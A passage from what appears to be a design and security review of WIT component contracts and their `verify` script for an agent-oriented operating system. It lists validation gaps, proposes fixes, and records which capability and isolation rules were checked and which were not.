  2. **Right claiming an `agent`-only import passes (`exit 0`):** `verify:53` searches all of `contracts/core.wit` rather than the package worlds (`service`, `app`, `wake-word`, `input-engine`). Changing `"accessibility-read"` from `reserved:` to `served by accessibility:` in `manifest.wit` matches `import accessibility;` inside `world agent` (`core.wit:396`) and exits `0`, even though no installable package world imports `accessibility`.
  3. **Right lines outside strict indentation/character regex silently vanish (`exit 0`):** `verify:41` requires exactly three spaces before `"` and `[a-z-]*`. Changing a right line to two spaces (`///  "microphone" bogus:`) or adding digits (`"camera2"`) drops the line silently while `verify` exits `0`.
  4. **Un-adopted features in non-`os:core` packages or non-matching world declarations pass (`exit 0`):** `verify:23, 32-34` only scans `contracts/core.wit` for `^world \([a-z-]*\) {$` and only validates worlds of `os:core`. Adding `err: option<error-context>, m: map<string, string>` to `contracts/manifest.wit` (which `core.wit` does not import), or adding `world extra-world { import foo: func() -> result<_, error-context>; }` to `contracts/store.wit`, or using two spaces (`world sneaky  {`) in `contracts/core.wit`, all exit `0` under `verify` lines 1–65 — defeating the guarantee in `core.wit:26-29` and `contracts/README.md:38, 46` that un-adopted features fail.
  5. **Pre-existing macOS failure at `verify:75, 78`:** Running `./verify` unmodified on macOS exits `1` after downloading `target/wasi-wit-0.3.2.tar.gz` (`usage: sha256sum [-bctwz] [files ...]`, `deps: ... does not match its sha256`), because Darwin's `/sbin/sha256sum` does not support `--status`.
- **Smallest correction:**
  1. Require at least one valid character before `:` in `verify:52` (`[a-z:/]\+`), check imports specifically within `world service` / `world app` / `world wake-word` / `world input-engine` (not `world agent`), and fail in `verify:40-45` if any quoted `///   "..."` line in that doc block fails to parse.
  2. Extract worlds across all files of `contracts/` with `wasm-tools` (or relaxed whitespace regex across `contracts/*.wit`), and wrap non-world interfaces (`os:manifest`, `os:shell`, `os:catalog-*`) in a temporary test world validated with `--features="-all,wasm2,component-model,cm-async"` so un-adopted features in `manifest.wit` and `shell.wit` also fail.
  3. Replace `sha256sum -c --status` with `shasum -a 256 -c` or a portable `openssl dgst -sha256` / `sha256sum` check (`verify:75, 78`).

---

## Checked and found correct

- **WASI 0.3.2 feature set (`core.wit:26-29`, `contracts/README.md:38`, `verify:17-36`):** Upstream `WebAssembly/WASI` `docs/ComponentModelFeatures.md` and `docs/Release.md` (read 16 November 2026) confirm WASI 0.3.0 adopted async (`cm-async`), 0.3.1 adopted `map` (`cm-map`) and `implements` + `external-id` (`cm-implements`), WASI 0.3.2 shipped on 13 October 2026, and WASI 0.3.3 is scheduled for 8 December 2026. Running `wasm-tools 1.263.0` confirms all six worlds of `os:core` (`base`, `service`, `app`, `agent`, `wake-word`, `input-engine`) validate under `-all,wasm2,component-model,cm-async`.
- **`keep` in action instances (`core.wit:284-289`, `store.wit:175-177`):** Denying `keep.put` and `keep.forget` in action instances and attenuating `keep.get` to read-only when `change` is `none` closes persistent handle leakage and unintended mutation of kept handles by `local` actions.
- **Input engine key forwarding and activation scope (`input.wit:103-116`):** Restricting `engine-output::forward` strictly to the current unconsumed `key-event` before emitting `edit` or `candidates` or receiving the next key, falling back to the system engine on violation, and barring third-party engines from `password`/`pin` fields and the agent's bar closes key fabrication and hoarding of consumed keys.
- **`entity.set` concurrency and post-`handle` state (`core.wit:397-402`, `agent.wit:239-256`):** Limiting an agent instance to one `handle` call at a time and letting `done`/`failed` persist after `handle` returns (while `asking`/`none` end with the task) resolves the earlier overlap and premature clear contradiction.
- **Streaming `progress` marks (`actions.wit:53-56, 253-255`):** Carrying the instance's current marks on each `progress` event read closes un-marked streaming leaks from running actions.
- **Task-grant invalidation and version pinning (`actions.wit:239-245`):** Pinning object arguments to their version, forcing confirmation for collections, and ending the grant when the task takes `untrusted` closes version-swap and post-injection grant replay.
- **Surface `set-title`, prop caps, overlay icon restrictions, and `focus-surface` (`ui.wit:53-67, 72-76`, `core.wit:57-60`, `shell.wit:65-72`):** Adding `set-title` (256 bytes, no control characters), making props capped at 65,536 bytes both per node and per `update` call (plus 16 MiB tree cap), forbidding `system`/`untrusted` icons on the overlay, and confirming `focus-surface` in `untrusted` tasks while returning `busy` when typing closes those round-1 gaps cleanly.
- **`memory` undo semantics (`agent.wit:172-176`):** Recording `remember` and `forget` in the task journal as `reversible, local` and restoring replaced entries on `undo` closes the memory-undo omission.
- **Explicitly deferred items noted in `Docs/architecture/security.md:96-100`:** The absence of camera/screen-capture rights in `manifest.wit` and the absence of a notification interface are already explicitly recorded in `security.md:99-100` and are not duplicated as findings.

## Not checked

- Compiling real Rust `wasm32-wasip3` components against Rust 1.100 (`core.wit:215-218`, `contracts/README.md:34`) to verify empirically that an empty `std` binary imports only `world base`.
- Verifying the upstream `wasi-wit-0.3.2.tar.gz` archive against `contracts/deps/` via GNU `sha256sum -c --status` on Linux (since `./verify` failed on macOS at `verify:78`).
- Reviewing kernel contracts (`Docs/architecture/kernel-interface.md`, `kernel.md`) or runtime implementation outside `dodos/contracts/`, `dodos/verify`, and the cited sections of `Docs/architecture/`, `Docs/decisions/README.md`, and `Docs/plan/pending-decisions.md`.
